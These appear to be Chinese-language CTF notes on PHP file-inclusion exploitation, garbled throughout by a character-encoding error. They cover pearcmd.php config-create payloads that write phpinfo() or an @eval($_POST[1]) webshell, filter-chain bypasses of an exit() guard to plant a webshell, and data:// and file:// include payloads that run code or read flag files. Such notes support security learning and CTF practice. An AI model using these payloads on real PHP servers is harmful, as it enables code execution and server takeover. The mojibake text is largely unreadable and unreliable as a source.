ï¼ˆ3ï¼‰è‹¥æ²¡æœ‰è¯»å–åˆ°PHPSESSIDè¿™ä¸ªCOOKIEï¼Œä¹Ÿä¼šåˆ›å»ºSESSIONè¶…å…¨å±€å˜é‡æ³¨å†Œsessionå˜é‡ã€‚åŒæ—¶åˆ›å»ºä¸€ä¸ªsess_abc321(åç§°ä¸ºéšæœºå€¼)çš„sessionæ–‡ä»¶ï¼ŒåŒæ—¶å°†abc321ä½œä¸ºPHPSESSIDçš„cookieå€¼è¿”å›ç»™æµè§ˆå™¨ç«¯ã€‚ pearcmd.phpæ¼æ´1.æ¦‚å¿µpeclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpeclpearæ˜¯é»˜è®¤å®‰è£…çš„ï¼› åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…ã€‚ ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcelpearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨usrlocallibphpã€‚ è¦åˆ©ç”¨è¿™ä¸ªpearcmd.phpéœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š ï¼ˆ1ï¼‰è¦å¼€å¯register_argc_argvè¿™ä¸ªé€‰é¡¹åœ¨Dockerä¸­ä½¿è‡ªåŠ¨å¼€å¯çš„ ï¼ˆ2ï¼‰è¦æœ‰æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨ 2.å¦‚ä½•åˆ©ç”¨çœ‹åˆ°config-createï¼Œå»é˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ æ‰€ä»¥æœ€åæ„é€ å‡ºpayload ä¾‹å­1ï¼š/index.php?+config-create+/file=/usr/local/lib/php/pearcmd.php/?=phpinfo()?+/tmp/hello.php ä¸Šé¢æ˜¯å°†å†™åˆ°tmphello.php,ç„¶åæˆ‘ä»¬å†ä½¿ç”¨æ–‡ä»¶åŒ…å«è¿›è¡ŒåŒ…å«æˆ‘ä»¬ä¹‹å‰å†™å…¥çš„æ–‡ä»¶ï¼ˆhello.phpï¼‰å°±å¯ä»¥äº†ã€‚ ä¾‹å­2ï¼špayload:/index.php?+config-create+/file=/usr/local/lib/php/pearcmd/?=@eval($_POST[1])?+/tmp/hello.php 3.æ³¨æ„ç”¨burpsuiteä¼ GETï¼Œç”¨hackbarä¼šè¢«urlç¼–ç ï¼Œä¼ å…¥æ–‡ä»¶æ— æ³•è§£æ 4.å®æˆ˜è¯¦è§å¦ä¸€ç¯‡æ–‡ç« ã€Šè§£é¢˜å¿ƒå¾—ã€‹ å€Ÿé‰´çš„æ–‡ç« ï¼šhttps://blog.csdn.net/JCPS_Y/article/details/127541665 phpä¼ªåè®®phpæ”¯æŒçš„ä¼ªåè®® 1 file: â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ2 http: â€” è®¿é—® HTTP(s) ç½‘å€3 ftp: â€” è®¿é—® FTP(s) URLs4 php: â€” è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµï¼ˆIO streamsï¼‰5 zlib: â€” å‹ç¼©æµ6 data: â€” æ•°æ®ï¼ˆRFC 2397ï¼‰7 glob: â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼8 phar: â€” PHP å½’æ¡£9 ssh2: â€” Secure Shell 210 rar: â€” RAR11 ogg: â€” éŸ³é¢‘æµ12 expect: â€” å¤„ç†äº¤äº’å¼çš„æµ php:filteråŸºç¡€php:filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ ç®€å•é€šä¿—çš„è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œåœ¨è¯»å…¥æˆ–å†™å…¥æ•°æ®çš„æ—¶å€™å¯¹æ•°æ®è¿›è¡Œå¤„ç†åè¾“å‡ºçš„ä¸€ä¸ªè¿‡ç¨‹ã€‚ php:filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp:filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚ åè®®å‚æ•°ï¼š åç§° æè¿° resourceè¦è¿‡æ»¤çš„æ•°æ®æµ è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ readè¯»é“¾çš„ç­›é€‰åˆ—è¡¨ è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ writeå†™é“¾çš„ç­›é€‰åˆ—è¡¨ è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨ ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ å¸¸ç”¨ï¼š php://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.php åˆ©ç”¨filteråè®®è¯»æ–‡ä»¶Â±ï¼Œå°†index.phpé€šè¿‡base64ç¼–ç åè¿›è¡Œè¾“å‡ºã€‚è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å¦‚æœä¸è¿›è¡Œç¼–ç ï¼Œæ–‡ä»¶åŒ…å«åå°±ä¸ä¼šæœ‰è¾“å‡ºç»“æœï¼Œè€Œæ˜¯å½“åšphpæ–‡ä»¶æ‰§è¡Œäº†ï¼Œè€Œé€šè¿‡ç¼–ç ååˆ™å¯ä»¥è¯»å–æ–‡ä»¶æºç ã€‚ è€Œä½¿ç”¨çš„convert.base64-encodeï¼Œå°±æ˜¯ä¸€ç§è¿‡æ»¤å™¨ã€‚ åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exitä»€ä¹ˆæ˜¯æ­»äº¡exitæ­»äº¡exitæŒ‡çš„æ˜¯åœ¨è¿›è¡Œå†™å…¥PHPæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°ï¼š file_put_contents($content, ?php exit(); . $content);äº¦æˆ–è€…file_put_contents($content, ?php exit();? . $content); è¿™æ ·ï¼Œå½“ä½ æ’å…¥ä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯è¿™æ ·å­çš„ï¼š ?php exit();??php @eval($_POST[snakin]);? è¿™æ ·å³ä½¿æ’å…¥äº†ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨è¢«ä½¿ç”¨çš„æ—¶å€™ä¹Ÿæ— æ³•è¢«æ‰§è¡Œã€‚è¿™æ ·çš„æ­»äº¡exité€šå¸¸å­˜åœ¨äºç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰ä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶å½“ä¸­ã€‚ ï¼ˆ1ï¼‰base64decodeç»•è¿‡åˆ©ç”¨filteråè®®æ¥ç»•è¿‡ï¼Œçœ‹ä¸‹è¿™æ ·çš„ä»£ç ï¼š ?php$content = ?php exit; ?;$content .= $_POST[txt];file_put_contents($_POST[filename], $content); å½“ç”¨æˆ·é€šè¿‡POSTæ–¹å¼æäº¤ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¼šä¸æ­»äº¡exitè¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œé¿å…æäº¤çš„æ•°æ®è¢«æ‰§è¡Œã€‚ ç„¶è€Œè¿™é‡Œå¯ä»¥åˆ©ç”¨php:filterçš„base64-decodeæ–¹æ³•ï¼Œå°†$contentè§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exitã€‚ base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œå½“PHPé‡åˆ°ä¸å¯è§£ç çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©æ€§çš„è·³è¿‡ï¼Œè¿™ä¸ªæ—¶å€™base64å°±ç›¸å½“äºä»¥ä¸‹çš„è¿‡ç¨‹ï¼š ?php$_GET[txt] = preg_replace(|[^a-z0-9A-Z+/]|s, , $_GET[txt]);base64_decode($_GET[txt]); æ‰€ä»¥ï¼Œå½“$content åŒ…å« ?php exit; ?æ—¶ï¼Œè§£ç è¿‡ç¨‹ä¼šå…ˆå»é™¤è¯†åˆ«ä¸äº†çš„å­—ç¬¦ï¼Œ ; ? å’Œç©ºæ ¼ç­‰éƒ½å°†è¢«å»é™¤ï¼Œäºæ˜¯å‰©ä¸‹çš„å­—ç¬¦å°±åªæœ‰phpexitä»¥åŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦äº†ã€‚ç”±äºbase64æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå†æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¾‹å¦‚æ·»åŠ å­—ç¬¦â€™aâ€™åï¼Œå°†â€™phpexitaâ€™å½“åšä¸¤ç»„base64è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ç»•è¿‡è¿™ä¸ªæ­»äº¡exitäº†ã€‚ è¿™ä¸ªæ—¶å€™åé¢å†åŠ ä¸Šç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥getshelläº†ã€‚ ï¼ˆ2ï¼‰strip_tagsç»•è¿‡è¿™ä¸ª?php exit; ?å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp:filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚ ä½†æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬ä¹Ÿæ˜¯XMLæ ‡ç­¾ï¼Œåœ¨ç”¨åˆ°strip_tagsæ—¶ä¹Ÿä¼šè¢«å»é™¤ã€‚ æ³¨æ„åˆ°åœ¨å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œfilteræ˜¯æ”¯æŒå¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚å¯ä»¥å…ˆå°†webshellç»è¿‡base64ç¼–ç ï¼Œstrip_tagså»é™¤æ­»äº¡exitä¹‹åï¼Œå†é€šè¿‡base64-decodeå¤åŸã€‚ è¿‡æ»¤å™¨å­—ç¬¦ä¸²è¿‡æ»¤å™¨è¯¥ç±»é€šå¸¸ä»¥stringå¼€å¤´ï¼Œå¯¹æ¯ä¸ªå­—ç¬¦éƒ½è¿›è¡ŒåŒæ ·æ–¹å¼çš„å¤„ç†ã€‚ string.rot13 ä¸€ç§å­—ç¬¦å¤„ç†æ–¹å¼ï¼Œå­—ç¬¦å³ç§»åä¸‰ä½ str_rot13ï¼ˆè‡ª PHP 4.3.0 èµ·ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ï¼‰â€”å¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13è½¬æ¢. ROT13 æ˜¯ä¸€ç§ç®€å•çš„æ›¿æ¢å¯†ç ï¼Œå°†å­—æ¯è¡¨ä¸­çš„æ¯ä¸ªå­—æ¯å‘åç§»åŠ¨13ä¸ªä½ç½®,åŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚è¿™æ„å‘³ç€å¯¹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œ ROT13 ç¼–ç ä¸¤æ¬¡ä¼šå¾—åˆ°åŸå§‹å­—ç¬¦ã€‚ $string = Hello, World!;$encoded = str_rot13($string);$decoded = str_rot13($encoded);echo $encoded; // è¾“å‡º Uryyb, Jbeyq!echo $decoded; // è¾“å‡º Hello, World! string.toupper string.toupperï¼ˆè‡ª PHP 5.0.0 èµ·ç­‰åŒäºç”¨ strtoupper()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨,å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¤§å†™ string.tolower string.tolowerï¼ˆè‡ª PHP 5.0.0 èµ·ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ï¼‰ä½¿ç”¨æ­¤è¿‡æ»¤å™¨,å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ string.strip_tags(è‡ª PHP 7.3.0 èµ·åºŸå¼ƒ)â€‹ string.strip_tagsä½¿ç”¨æ­¤è¿‡æ»¤å™¨ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚å¯ä»¥ç”¨ä¸¤ç§æ ¼å¼æ¥æ”¶å‚æ•°ï¼šä¸€ç§æ˜¯å’Œstrip_tags()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ç›¸ä¼¼çš„ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åˆ—è¡¨çš„å­—ç¬¦ä¸²ï¼Œä¸€ç§æ˜¯ä¸€ä¸ªåŒ…å«æœ‰æ ‡è®°åçš„æ•°ç»„ã€‚ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°.è¯¥å‡½æ•°å°è¯•è¿”å›ç»™å®šçš„å­—ç¬¦ä¸²strå»é™¤ç©ºå­—ç¬¦ã€HTML å’Œ PHP æ ‡è®°åçš„ç»“æœã€‚ä¸strip_tags()å‡½æ•°è¯¥è¿‡æ»¤å™¨ä¼šå®Œå…¨å»é™¤æ‰€æœ‰çš„ HTML å’Œ PHP æ ‡ç­¾**ï¼Œæ— æ³•é€šè¿‡å‚æ•°æ¥æŒ‡å®šå…è®¸ä¿ç•™çš„æ ‡ç­¾ã€‚ $html = pHello, bWorld!/b/p;$filtered = file_get_contents(php://filter/string.strip_tags/resource=data:text/plain, . urlencode($html));#è¿›è¡Œç¼–ç é˜²æ­¢ä¹±ç å‡ºç°echo $filtered; // è¾“å‡º Hello, World! è½¬æ¢è¿‡æ»¤å™¨ï¼ˆ1ï¼‰å¯¹æ•°æ®æµè¿›è¡Œç¼–ç ï¼Œé€šå¸¸ç”¨æ¥è¯»å–æ–‡ä»¶æºç ã€‚ convert.base64-encode convert.base64-decode ï¼ˆ2ï¼‰base64åŠ å¯†è§£å¯† convert.quoted-printable-encode convert.quoted-printable-decode å¯ä»¥ç¿»è¯‘ä¸ºå¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç ï¼Œä½¿ç”¨å¯ä»¥æ‰“å°çš„ASCIIç¼–ç çš„å­—ç¬¦è¡¨ç¤ºå„ç§ç¼–ç å½¢å¼ä¸‹çš„å­—ç¬¦ã€‚ å‹ç¼©è¿‡æ»¤å™¨è™½ç„¶ å‹ç¼©å°è£…åè®® æä¾›äº†åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ åˆ›å»º gzip å’Œ bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸ä»£è¡¨å¯ä»¥åœ¨ç½‘ç»œçš„æµä¸­æä¾›é€šç”¨å‹ç¼©çš„æ„æ€ï¼Œä¹Ÿä¸ä»£è¡¨å¯ä»¥å°†ä¸€ä¸ªéå‹ç¼©çš„æµè½¬æ¢æˆä¸€ä¸ªå‹ç¼©æµã€‚å¯¹æ­¤ï¼Œå‹ç¼©è¿‡æ»¤å™¨å¯ä»¥åœ¨ä»»ä½•æ—¶å€™åº”ç”¨äºä»»ä½•æµèµ„æºã€‚ zlib.deflateï¼ˆå‹ç¼©ï¼‰å’Œ zlib.inflateï¼ˆè§£å‹ï¼‰å®ç°äº†å®šä¹‰ä¸ Â» RFC 1951 çš„å‹ç¼©ç®—æ³•ã€‚ deflate è¿‡æ»¤å™¨å¯ä»¥æ¥å—ä»¥ä¸€ä¸ªå…³è”æ•°ç»„ä¼ é€’çš„æœ€å¤šä¸‰ä¸ªå‚æ•°ã€‚ levelå®šä¹‰äº†å‹ç¼©å¼ºåº¦ï¼ˆ1-9ï¼‰ã€‚ æ•°å­—æ›´é«˜é€šå¸¸ä¼šäº§ç”Ÿæ›´å°çš„è½½è·ï¼Œä½†è¦æ¶ˆè€—æ›´å¤šçš„å¤„ç†æ—¶é—´ã€‚ å­˜åœ¨ä¸¤ä¸ªç‰¹æ®Šå‹ç¼©ç­‰çº§ï¼š0ï¼ˆå®Œå…¨ä¸å‹ç¼©ï¼‰å’Œ -1ï¼ˆzlib å†…éƒ¨é»˜è®¤å€¼ï¼Œç›®å‰æ˜¯ 6ï¼‰ã€‚ windowæ˜¯å‹ç¼©å›æº¯çª—å£å¤§å°ï¼Œä»¥äºŒçš„æ¬¡æ–¹è¡¨ç¤ºã€‚ æ›´é«˜çš„å€¼ï¼ˆå¤§åˆ° 15 â€”â€” 32768 å­—èŠ‚ï¼‰äº§ç”Ÿæ›´å¥½çš„å‹ç¼©æ•ˆæœä½†æ¶ˆè€—æ›´å¤šå†…å­˜ï¼Œ ä½çš„å€¼ï¼ˆä½åˆ° 9 â€”â€” 512 å­—èŠ‚ï¼‰äº§ç”Ÿäº§ç”Ÿè¾ƒå·®çš„å‹ç¼©æ•ˆæœä½†å†…å­˜æ¶ˆè€—ä½ã€‚ ç›®å‰é»˜è®¤çš„ window å¤§å°æ˜¯ **15**ã€‚ memoryç”¨æ¥æŒ‡ç¤ºè¦åˆ†é…å¤šå°‘å·¥ä½œå†…å­˜ã€‚ åˆæ³•çš„æ•°å€¼èŒƒå›´æ˜¯ä» 1ï¼ˆæœ€å°åˆ†é…ï¼‰åˆ° 9ï¼ˆæœ€å¤§åˆ†é…ï¼‰ã€‚ å†…å­˜åˆ†é…ä»…å½±å“é€Ÿåº¦ï¼Œä¸ä¼šå½±å“ç”Ÿæˆçš„è½½è·çš„å¤§å°ã€‚ Note: å‹ç¼©è¿‡æ»¤å™¨ ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚ zlib.* å‹ç¼©è¿‡æ»¤å™¨è‡ª PHP ç‰ˆæœ¬ 5.1.0èµ·å¯ç”¨ï¼Œåœ¨æ¿€æ´» zlibçš„å‰æä¸‹ã€‚ä¹Ÿå¯ä»¥é€šè¿‡å®‰è£…æ¥è‡ª Â» PECLçš„ Â» zlib_filteråŒ…ä½œä¸ºä¸€ä¸ªåé—¨åœ¨ 5.0.xç‰ˆä¸­ä½¿ç”¨ã€‚æ­¤è¿‡æ»¤å™¨åœ¨ PHP 4 ä¸­ ä¸å¯ç”¨ã€‚?file=compress.zlib://flag.php åŠ å¯†è¿‡æ»¤å™¨mcrypt.*å’Œ mdecrypt.*ä½¿ç”¨ libmcrypt æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚ æ›´å¤šå¦™ç”¨ï¼šhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html data:ï¼ˆä¸åŒ…å«å‡½æ•°ç»“åˆï¼‰æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ 1ã€data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,?php%20phpinfo();? 2ã€data://text/plain;base64,ç»è¿‡base64ç¼–ç å†ç»è¿‡urlç¼–ç çš„æ•°æ®http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b çŸ¥è¯†ç‚¹è¡¥å……ï¼šbase64ç¼–ç  Base64 ä¸æ˜¯åŠ å¯†ç®—æ³•ï¼Œè€Œæ˜¯ä¸€ç§ç¼–ç æ–¹å¼ï¼Œå¸¸ç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºæ–‡æœ¬æ•°æ®ã€‚Base64 ç¼–ç é€šè¿‡å°†æ•°æ®è½¬æ¢ä¸ºä¸€ç§ç”± 64 ä¸ªä¸åŒå­—ç¬¦ç»„æˆçš„ ASCII å­—ç¬¦ä¸²æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®ã€‚ åœ¨ PHP ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ base64_encode() å‡½æ•°æ¥å¯¹æ•°æ®è¿›è¡Œ Base64 ç¼–ç ï¼Œä»¥åŠä½¿ç”¨ base64_decode() å‡½æ•°å°† Base64 ç¼–ç çš„æ•°æ®è§£ç ä¸ºåŸå§‹æ•°æ®ã€‚ ä¾‹å­ä¸€ï¼šæ‰“å° data: çš„å†…å®¹ ?php// æ‰“å° I love PHPecho file_get_contents ( data://text/plain;base64,SSBsb3ZlIFBIUAo= );? å¯¹è¯¥ä»£ç çš„è§£é‡Šï¼šè¿™æ®µ PHP ä»£ç ä½¿ç”¨äº† file_get_contents å‡½æ•°æ¥è¯»å–æŒ‡å®š URI çš„å†…å®¹å¹¶å°†å…¶è¾“å‡ºã€‚ å…·ä½“æ¥è¯´ï¼Œfile_get_contents å‡½æ•°ç”¨äºä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒè¯»å–çš„æ˜¯ä¸€ä¸ª Data URIï¼Œè¿™æ˜¯ä¸€ç§åœ¨ URL ä¸­åµŒå…¥æ•°æ®çš„æ–¹å¼ã€‚Data URI æ˜¯ä¸€ç§å°†å°æ–‡ä»¶ç›´æ¥åµŒå…¥åˆ°æ–‡æ¡£ä¸­çš„æ–¹æ¡ˆï¼Œé€šå¸¸ç”¨äºå°†å›¾ç‰‡ã€éŸ³é¢‘ã€æ–‡æœ¬ç­‰æ–‡ä»¶ç¼–ç ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥åœ¨ URL ä¸­ä¼ è¾“ã€‚ åœ¨è¿™é‡Œï¼Œdata: å‰ç¼€è¡¨ç¤ºå°†ä»æ•°æ®æµä¸­è¯»å–å†…å®¹ï¼Œtextplain;base64 æŒ‡å®šäº†æ•°æ®çš„ MIME ç±»å‹ï¼ˆè¿™é‡Œæ˜¯æ–‡æœ¬ç±»å‹ï¼Œå¹¶ä¸”å†…å®¹æ˜¯ç»è¿‡ Base64 ç¼–ç çš„ï¼‰ï¼Œåé¢çš„ Base64 ç¼–ç å­—ç¬¦ä¸² SSBsb3ZlIFBIUAo å®é™…ä¸Šæ˜¯æ–‡æœ¬å­—ç¬¦ä¸² â€œI love PHPâ€ çš„ Base64 ç¼–ç ã€‚ æ‰€ä»¥ï¼Œfile_get_contents(â€˜data:textplain;base64,SSBsb3ZlIFBIUAoâ€™) è¯»å–äº†è¿™ä¸ª Base64 ç¼–ç å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è§£ç ä¸º â€œI love PHPâ€ï¼Œæœ€åé€šè¿‡ echo å‘½ä»¤è¾“å‡ºåˆ°é¡µé¢ä¸Šã€‚ ä¾‹å­äºŒï¼šè·å–åª’ä½“ç±»å‹ ?php$fp = fopen ( data://text/plain;base64, , r );$meta = stream_get_meta_data ( $fp );// æ‰“å° text/plainecho $meta [ mediatype ];? è§£é‡Šï¼šè¿™æ®µ PHP ä»£ç ä½¿ç”¨äº† fopen å‡½æ•°ä»¥åªè¯»æ¨¡å¼æ‰“å¼€ä¸€ä¸ª Data URI çš„èµ„æºï¼Œç„¶åä½¿ç”¨ stream_get_meta_data å‡½æ•°è·å–æœ‰å…³èµ„æºçš„å…ƒæ•°æ®ã€‚ å…·ä½“æ¥è¯´ï¼Œfopen å‡½æ•°æ‰“å¼€äº†ä¸€ä¸ªæŒ‡å‘ Data URI çš„æ–‡ä»¶å¥æŸ„ $fpï¼Œä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒData URI çš„å†…å®¹éƒ¨åˆ†æ˜¯ç©ºçš„ã€‚è¿™ä¸ª Data URI æ˜¯ text/plain ç±»å‹çš„æ•°æ®æµï¼Œä½†æ˜¯æ²¡æœ‰æä¾›å®é™…çš„æ•°æ®å†…å®¹ã€‚æ‰€ä»¥å®é™…ä¸Šæ²¡æœ‰å†…å®¹å¯è¯»ï¼Œåªæ˜¯æ‰“å¼€äº†è¿™ä¸ªæ•°æ®æµã€‚ ç„¶åï¼Œstream_get_meta_data å‡½æ•°ç”¨äºè·å–ä¸ $fp æ–‡ä»¶å¥æŸ„ç›¸å…³çš„å…ƒæ•°æ®ã€‚åœ¨è¿™é‡Œï¼Œ$meta å˜é‡æ¥æ”¶äº†è¿™äº›å…ƒæ•°æ®ã€‚å…¶ä¸­ï¼Œ$meta[mediatype] è¡¨ç¤ºè¿™ä¸ªæ•°æ®æµçš„åª’ä½“ç±»å‹ã€‚ç”±äºåœ¨æ‰“å¼€æ—¶æœªæä¾›å…·ä½“çš„ Base64 ç¼–ç æ•°æ®ï¼Œæ‰€ä»¥æ— æ³•è¯»å–å®é™…çš„å†…å®¹ï¼Œä½†èƒ½å¤Ÿå¾—åˆ°çš„æ˜¯åª’ä½“ç±»å‹çš„ä¿¡æ¯ã€‚ 3.file:ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè‹¥ä¸åŠ åè®®åç§°ï¼Œé»˜è®¤ä¸ºfile://åè®®ï¼›å¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“file:åè®®ä¸»è¦ç”¨äºè®¿é—®æ–‡ä»¶(ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠç½‘ç»œè·¯å¾„) #Linuxcmd=file:///path/to/flag #æ ¹ç›®å½•ä¸‹pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ â€”â€”æ­¤å¤„æœ‰///ä¸‰æ¡cmd=file://relative/path/flag #å½“å‰ç›®å½•ä¸‹relativeæ–‡ä»¶å¤¹ä¸­pathæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=file://flag #å½“å‰ç›®å½•ä¸‹çš„flagæ–‡ä»¶#Windows cmd=file://C:/path/to/flag.txt #Cç›˜ä¸­pathæ–‡ä»¶å¤¹ä¸­toæ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶cmd=file://C:flag.txt #Cç›˜ä¸‹flagæ–‡ä»¶cmd=file://flag.txt #å½“å‰æ–‡ä»¶å¤¹ä¸‹flagæ–‡ä»¶ 